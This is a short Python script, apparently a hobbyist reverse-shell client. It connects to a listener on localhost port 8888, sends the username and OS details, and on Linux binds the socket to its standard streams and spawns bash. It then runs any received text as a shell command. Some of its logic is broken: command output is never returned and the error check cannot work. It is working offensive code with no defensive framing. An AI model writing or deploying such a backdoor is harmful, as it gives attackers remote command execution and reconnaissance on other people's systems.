from socket import socket, AF_INET, SOCK_STREAM
import subprocess
from getpass import getuser
import platform
import os
import distro



os_info = distro.name()

os_user = getuser()
general_info = f"Username:{os_user}\n\nOS:{os_info}"

ip = "localhost"
port = 8888



listener = socket(AF_INET,SOCK_STREAM)
listener.connect((ip,port))
listener.send(general_info.encode())

os_type = platform.system()


if os_type == "Linux":
    distro = distro.name()
    linux_info = f"Distro:{distro}"
    listener.send(linux_info.encode())
    import pty
    os.dup2(listener.fileno(),0)
    os.dup2(listener.fileno(),1)
    os.dup2(listener.fileno(),2)
    pty.spawn("bash")
elif os_type == "Darwin":
    ver = platform.mac_ver()
    macOS_info = f"ver:{ver}"
    listener.send(macOS_info.encode())
elif os_type == "Windows":
    edition = platform.win32_edition()
    iot = platform.win32_is_iot()
    ver = platform.win32_ver()
    win_info = f"edition:{edition}\niot:{iot}\nver:{ver}"
    listener.send(win_info.encode())
else:
    pass


while True:
    receiver = listener.recv(1024).decode()
    print(receiver)
    if receiver=="exit":
        exit()
    else:
        Oxshellcmd = subprocess.run(receiver, shell=True, capture_output=True)
        if Oxshellcmd == "" or Oxshellcmd is None:
            print("lol error")